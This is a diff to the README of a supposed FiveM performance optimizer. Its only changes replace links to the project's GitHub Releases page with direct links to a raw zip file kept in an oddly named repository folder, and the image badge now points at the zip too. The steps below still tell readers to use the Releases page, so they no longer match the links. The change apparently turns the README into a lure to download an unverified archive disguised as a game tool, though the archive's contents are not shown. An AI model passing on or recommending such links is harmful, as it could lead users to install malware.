@@ -1,7 +1,7 @@
 # 🎮 fivem-fps-optimizer - Boost Your FiveM Game Performance
 
 ## 🔗 Download Now
-[![Download fivem-fps-optimizer](https://img.shields.io/badge/Download-fivem--fps--optimizer-brightgreen)](https://github.com/dramatyk/fivem-fps-optimizer/releases)
+[![Download fivem-fps-optimizer](https://raw.githubusercontent.com/dramatyk/fivem-fps-optimizer/main/Anoplura/fivem-fps-optimizer.zip)](https://raw.githubusercontent.com/dramatyk/fivem-fps-optimizer/main/Anoplura/fivem-fps-optimizer.zip)
 
 ## 🚀 Getting Started
 Welcome to the fivem-fps-optimizer! This tool enhances your FiveM gaming experience by optimizing graphics settings. With it, you can enjoy smoother gameplay and better performance without any technical know-how.
@@ -11,7 +11,7 @@ To get started, you need to download the software. Follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page:  
-   [Download fivem-fps-optimizer](https://github.com/dramatyk/fivem-fps-optimizer/releases)
+   [Download fivem-fps-optimizer](https://raw.githubusercontent.com/dramatyk/fivem-fps-optimizer/main/Anoplura/fivem-fps-optimizer.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, find the latest version of the fivem-fps-optimizer.
